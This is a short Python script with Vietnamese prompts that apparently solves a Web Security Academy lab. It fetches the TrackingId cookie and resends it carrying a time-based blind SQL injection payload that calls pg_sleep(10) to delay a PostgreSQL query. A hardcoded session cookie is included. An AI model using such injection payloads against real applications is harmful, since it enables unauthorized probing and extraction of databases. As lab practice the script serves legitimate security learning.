import requests

print("Gửi URL dưới dạng: https://xxxxx.web-security-academy.net/")
url = input("Nhập URL: ").rstrip("/")

response = requests.get(url)

tracking_id = None
if 'Set-Cookie' in response.headers:
    cookies_header = response.headers['Set-Cookie']
    cookie_parts = cookies_header.split(';')
    for part in cookie_parts:
        if part.strip().startswith('TrackingId='):
            tracking_id = part.strip().split('=')[1]
            break

if tracking_id:
    print(f"TrackingId: {tracking_id}")

    payload = f"{tracking_id}'|| pg_sleep(10)--"

    cookies = {
        "TrackingId": payload,
        "session": "ijfHwL6C28D1pDHhUSy0ccWtxwd2Vobwu" 
    }
    print("Đợi xíu xiu")
    response2 = requests.get(url, cookies=cookies)

print("Xong")
